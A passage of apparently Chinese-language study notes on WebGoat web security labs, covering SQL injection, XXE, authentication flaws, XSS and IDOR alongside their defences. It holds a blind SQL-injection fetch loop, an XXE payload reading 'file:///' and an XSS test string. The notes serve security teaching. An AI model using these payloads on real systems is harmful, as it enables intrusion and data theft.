plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token known-class-name class-name\" style=\"color:rgb(255, 203, 107)\">Array</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token keyword module\" style=\"font-style:italic\">from</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"> </span><span class=\"token literal-property property\">length</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">10</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">_</span><span class=\"token parameter punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token parameter\"> k</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> k</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">forEach</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">item</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">fetch</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token template-string string\" style=\"color:rgb(195, 232, 141)\">http://localhost:8080/WebGoat/SqlInjection/servers?column=(case when exists(select id from servers where hostname=&#x27;webgoat-prd&#x27; and substring(ip,1,1)=</span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">${</span><span class=\"token template-string interpolation\">item</span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token template-string string\" style=\"color:rgb(195, 232, 141)\">) then id else ip end)</span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">then</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">json</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">then</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">result</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> </span><span class=\"token console class-name\" style=\"color:rgb(255, 203, 107)\">console</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">log</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token template-string string\" style=\"color:rgb(195, 232, 141)\">result - </span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">${</span><span class=\"token template-string interpolation\">item</span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> result</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"防範-sql-injection\">防範 SQL Injection<a href=\"#防範-sql-injection\" class=\"hash-link\" aria-label=\"防範 SQL Injection的直接連結\" title=\"防範 SQL Injection的直接連結\">​</a></h3><p>要減少被 SQL Injection 的機會最重要的是不要使用 <strong>Dynamic Queries</strong>，而是改用 <strong>Static Queries</strong> 或 <strong>Parameterized Queries</strong>：</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"static-query\">Static Query<a href=\"#static-query\" class=\"hash-link\" aria-label=\"Static Query的直接連結\" title=\"Static Query的直接連結\">​</a></h4><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- Static Query</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">select</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">*</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">from</span><span class=\"token plain\"> products</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">select</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">*</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">from</span><span class=\"token plain\"> users </span><span class=\"token keyword\" style=\"font-style:italic\">where</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">user</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;&#x27;&quot;</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">+</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">session</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">getAttribute</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;UserID&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">+</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;&#x27;&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"parameterized-query\">Parameterized Query<a href=\"#parameterized-query\" class=\"hash-link\" aria-label=\"Parameterized Query的直接連結\" title=\"Parameterized Query的直接連結\">​</a></h4><div class=\"language-java codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-java codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">String query = &quot;SELECT * FROM users WHERE last_name = ?&quot;;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">PreparedStatement statement = connection.prepareStatement(query);</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">statement.setString(1, accountName);</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">ResultSet results = statement.executeQuery();</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"減少授權的對象\">減少授權的對象<a href=\"#減少授權的對象\" class=\"hash-link\" aria-label=\"減少授權的對象的直接連結\" title=\"減少授權的對象的直接連結\">​</a></h4><ul><li>對於每一個會連結到資料庫的應用程式都應該要擁有不同的驗證訊息（例如，連線字串）</li><li>應用程式通常不需要擁有刪除資料庫或資料表的權限</li><li>資料庫的帳號應該限制 schema 的存取</li><li>根據不同的資料庫帳號設定不同的存取權限，有些只能讀取，有些可以讀寫</li></ul><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"注意\">注意<a href=\"#注意\" class=\"hash-link\" aria-label=\"注意的直接連結\" title=\"注意的直接連結\">​</a></h4><ul><li>即使已經透過 Parameterized Query 的方式來避免 SQL injection，<strong>表單驗證仍然一定要做，以此避免其他可能的攻擊</strong>，例如，Stored XSS, Information leakage, Logic errors – business rule validation 等。</li><li>若你的網站有提供排序的功能（<code>order by</code>），應該要把可以被排序的欄位放入「白名單」中（例如，<code>firstname</code>），而不是讓使用者可以填入任何內容去做排序。</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"xxe-xml-external-entity-attack\">XXE (XML External Entity attack)<a href=\"#xxe-xml-external-entity-attack\" class=\"hash-link\" aria-label=\"XXE (XML External Entity attack)的直接連結\" title=\"XXE (XML External Entity attack)的直接連結\">​</a></h2><p><strong>XML External Entity 攻擊主要針對會解析 XML 的應用程式。這種攻擊會先定義具惡意內容的外部實體（external entity），然後再 XML 解析時去引用或參照到這個外部實體</strong>，如此以達到洩漏機密資料、服務拒絕存取、偽造伺服器端的請求、掃描 port、以及其他對系統可能的影響。</p><p>一般來說 XXE 的攻擊可以分區成：</p><ul><li><strong>Classic</strong>：外部的 entity 被包含在本機的 <strong>Document Type Definition (DTD)</strong></li><li><strong>Blind</strong>：在回應中沒有錯誤或回傳結果</li><li><strong>Error</strong>：試著從錯誤訊息中找到想要的內容</li></ul><p>攻擊者自己定義 XML 外部的 entity，然後寫入 XML 中，如此進行攻擊：</p><div class=\"language-xml-dtd codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-xml-dtd codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot; ?&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">&lt;!-- 定義外部 entity 名為 js --&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">&lt;!DOCTYPE author [</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  &lt;!ELEMENT author (#PCDATA)&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  &lt;!ENTITY js &quot;Jo Smith&quot;&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">]&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">&lt;!-- 在 XML 文件中引用外部實體 --&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">&lt;author&gt;&amp;js;&lt;/author&gt;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><blockquote><p><a href=\"https://www.w3schools.com/xml/xml_dtd_intro.asp\" target=\"_blank\" rel=\"noopener noreferrer\">XML DTD Tutorial</a> @ W3School</p></blockquote><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"example\">Example<a href=\"#example\" class=\"hash-link\" aria-label=\"Example的直接連結\" title=\"Example的直接連結\">​</a></h4><p>舉例來說，原本使用者填入的資料會出現在 <code>&lt;text&gt;&lt;/text&gt;</code> 內，透過 XXE 的方式，引入外部定義好的實體，即可取得使用者資料夾的內容：</p><div class=\"language-xml codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-xml codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token prolog\">&lt;?xml version=&quot;1.0&quot; encoding=&#x27;UTF-8&#x27;?&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token doctype punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">&lt;!</span><span class=\"token doctype doctype-tag\" style=\"color:rgb(199, 146, 234);font-style:italic\">DOCTYPE</span><span class=\"token doctype\" style=\"color:rgb(199, 146, 234);font-style:italic\"> </span><span class=\"token doctype name\" style=\"color:rgb(199, 146, 234);font-style:italic\">comment</span><span class=\"token doctype\" style=\"color:rgb(199, 146, 234);font-style:italic\"> </span><span class=\"token doctype punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">[</span><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\">  </span><span class=\"token doctype internal-subset tag punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">&lt;</span><span class=\"token doctype internal-subset tag\" style=\"color:rgb(255, 85, 114);font-style:italic\">!ELEMENT</span><span class=\"token doctype internal-subset tag\" style=\"color:rgb(255, 85, 114);font-style:italic\"> </span><span class=\"token doctype internal-subset tag attr-name\" style=\"color:rgb(255, 203, 107);font-style:italic\">comment</span><span class=\"token doctype internal-subset tag\" style=\"color:rgb(255, 85, 114);font-style:italic\"> </span><span class=\"token doctype internal-subset tag attr-name\" style=\"color:rgb(255, 203, 107);font-style:italic\">(#PCDATA)</span><span class=\"token doctype internal-subset tag punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">&gt;</span><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\">  &lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token doctype internal-subset\" style=\"color:rgb(199, 146, 234);font-style:italic\"></span><span class=\"token doctype punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">]</span><span class=\"token doctype punctuation\" style=\"color:rgb(199, 146, 234);font-style:italic\">&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">comment</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\">  </span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">text</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token entity named-entity\">&amp;xxe;</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;/</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">text</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;/</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">comment</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"防範-xxe\">防範 XXE<a href=\"#防範-xxe\" class=\"hash-link\" aria-label=\"防範 XXE的直接連結\" title=\"防範 XXE的直接連結\">​</a></h3><p>要避免 XXE 攻擊最重要的是去檢驗所有不信任的客戶端傳送過來的資料，在 Java 中可以告訴 parse 完全忽略 DTD。同時適當地於伺服器端驗證 HTTP 標頭中的 <strong>Content-type</strong> 和 <strong>Accept</strong>。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"驗證漏洞-authentication-flaws\">驗證漏洞 Authentication Flaws<a href=\"#驗證漏洞-authentication-flaws\" class=\"hash-link\" aria-label=\"驗證漏洞 Authentication Flaws的直接連結\" title=\"驗證漏洞 Authentication Flaws的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"authentication-bypassed\">Authentication Bypassed<a href=\"#authentication-bypassed\" class=\"hash-link\" aria-label=\"Authentication Bypassed的直接連結\" title=\"Authentication Bypassed的直接連結\">​</a></h3><ul><li><strong>Hidden Inputs</strong>：透過修改表單中的參數名稱、參數值或移除參數來試著找出漏洞</li><li><strong>Removing Parameters</strong>：有時攻擊者如果不清楚參數正確的值，他們會移除所有送出的參數來看會發生什麼。</li><li><strong>Forced Browsing</strong>：如果一個網站的設定不恰當，有機會可以透過猜測或暴力破解的方式來進入特定網頁。</li></ul><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"json-web-tokenjwt\">JSON Web Token(JWT)<a href=\"#json-web-tokenjwt\" class=\"hash-link\" aria-label=\"JSON Web Token(JWT)的直接連結\" title=\"JSON Web Token(JWT)的直接連結\">​</a></h3><p>JWT 的部分可以參考 <!-- -->[JWT 學習筆記]<!-- -->(/Users/pjchen/Projects/Notes/source/<!-- -->_<!-- -->posts/WebDevelopment/<!-- -->[Note]<!-- --> JWT 學習筆記.md)。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"password-reset\">Password reset<a href=\"#password-reset\" class=\"hash-link\" aria-label=\"Password reset的直接連結\" title=\"Password reset的直接連結\">​</a></h3><p>每個網站都有「重設密碼」的功能，但進行的方式可能不同，有些公司甚至還會透過電子郵件傳送明碼，這種網站你應該要非常留意，因為這表示它們將你的密碼使用明碼儲存。</p><p>在建立重設密碼的功能時，需要確定：</p><ul><li>每一次的連結都是獨特（unique）且帶有隨機的 token 的：確保攻擊者無法使用簡單的 DOS 攻擊</li><li>只能被使用一次：避免密碼可以被再次重設</li><li>每個連結只能使用一小時：減少被攻擊的可能</li></ul><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"透過重設密碼找出-email-是否存在\">透過重設密碼找出 email 是否存在<a href=\"#透過重設密碼找出-email-是否存在\" class=\"hash-link\" aria-label=\"透過重設密碼找出 email 是否存在的直接連結\" title=\"透過重設密碼找出 email 是否存在的直接連結\">​</a></h4><p>有些駭客會透過「重設密碼」的功能觀察某個使用者是否已經註冊該網站會員，然後再透過寄送假的驗證信，騙取使用者的帳號密碼：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/61zpcJB.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"cross-site-scripting-xss\">Cross-Site Scripting (XSS)<a href=\"#cross-site-scripting-xss\" class=\"hash-link\" aria-label=\"Cross-Site Scripting (XSS)的直接連結\" title=\"Cross-Site Scripting (XSS)的直接連結\">​</a></h2><p>Cross-site scripting (XSS) 是一種透過 <code>&lt;script&gt;</code> 來讓瀏覽器在未經過濾惡意程式碼的情況下將這些惡意程式執行在瀏覽器上。</p><p>常見的 XSS 攻擊出現在：</p><ul><li>會呈現使用者搜尋的結果的搜尋欄位</li><li>會顯示使用者所輸入資料的輸入欄位（input field）</li><li>會回傳使用者提供文字的錯誤訊息</li><li>隱藏使用者提供的資料的隱藏欄位</li><li>任何會顯示使用者所提供的資料的頁面，例如 message boards 或 comments。在 input 欄位內輸入 <code>&lt;script&gt;alert(&#x27;my javascript here&#x27;)&lt;/script&gt;</code> 看看是否有被執行。</li><li>HTTP Headers</li></ul><p>常見的 XSS 類型可以分成下面幾類。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"reflected--dom-based\">Reflected / DOM-based<a href=\"#reflected--dom-based\" class=\"hash-link\" aria-label=\"Reflected / DOM-based的直接連結\" title=\"Reflected / DOM-based的直接連結\">​</a></h3><ul><li>透過使用者所發出的請求在瀏覽器上呈現有害的內容</li><li>在伺服器回應後，將有害的內容顯示在頁面上</li><li>需要用到社交工程（social engineering）</li><li>透過使用者授權瀏覽器的權限來執行一些功能</li><li>常見情境像是攻擊者會寄送惡意連結給受害人，受害人點開連結後會進入到惡意的網頁，該網頁中的惡意程式會在受害者的瀏覽器中執行，以此竊取機密資訊等。</li></ul><p><img loading=\"lazy\" src=\"../../../i.imgur.com/K5piNEW.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"stored-or-persistent\">Stored or Persistent<a href=\"#stored-or-persistent\" class=\"hash-link\" aria-label=\"Stored or Persistent的直接連結\" title=\"Stored or Persistent的直接連結\">​</a></h3><ul><li>將有害的內容存在伺服器上的資料庫、檔案系統內等，在使用者稍後瀏覽頁面時呈現。</li><li>不需要使用到社交工程。</li></ul><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"self-xss-or-reflected-xss\">Self XSS or Reflected XSS<a href=\"#self-xss-or-reflected-xss\" class=\"hash-link\" aria-label=\"Self XSS or Reflected XSS的直接連結\" title=\"Self XSS or Reflected XSS的直接連結\">​</a></h3><p>Self XSS 通常是透過社交工程的方式，「讓你自己主動」去執行某段程式，例如把某段代碼複製貼上到瀏覽器執行。</p><p>Reflected XSS 則是讓使用者點擊某個網址後，透過 HTTP 回應的內容就加以執行攻擊。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"防範-xss\">防範 XSS<a href=\"#防範-xss\" class=\"hash-link\" aria-label=\"防範 XSS的直接連結\" title=\"防範 XSS的直接連結\">​</a></h3><p>要防範 XSS 最基本的作法對於所有不信任來源的 input 都要以 encode 後的方式呈現在瀏覽器上，而不是直接讓他執行。</p><ul><li>將 HTML Body 和 Attribute 內的 HTML Entities 都進行編碼</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"access-control-flow\">Access Control Flow<a href=\"#access-control-flow\" class=\"hash-link\" aria-label=\"Access Control Flow的直接連結\" title=\"Access Control Flow的直接連結\">​</a></h2><p><strong>沒有做好資料存取的管理，使得沒有該權限的使用者一樣可以存取到特定資訊。</strong></p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"insecure-direct-object-references-idor\">Insecure Direct Object References (IDOR)<a href=\"#insecure-direct-object-references-idor\" class=\"hash-link\" aria-label=\"Insecure Direct Object References (IDOR)的直接連結\" title=\"Insecure Direct Object References (IDOR)的直接連結\">​</a></h3><p>例如說，當你登入後可以使用 <code>https://some.company.tld/app/user/23398</code> 這個網址看到你自己的個人資料，但當你修改網址後的 <code>:user_id</code> 成 <code>https://some.company.tld/app/user/12345</code> 時，卻發現即使不用使用他的帳號登入，一樣可以看到他的使用者資料。相似的，你可能也可以透過類似的方式來新增修改其他人的資料。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"missing-function-level-access-control\">Missing Function Level Access Control<a 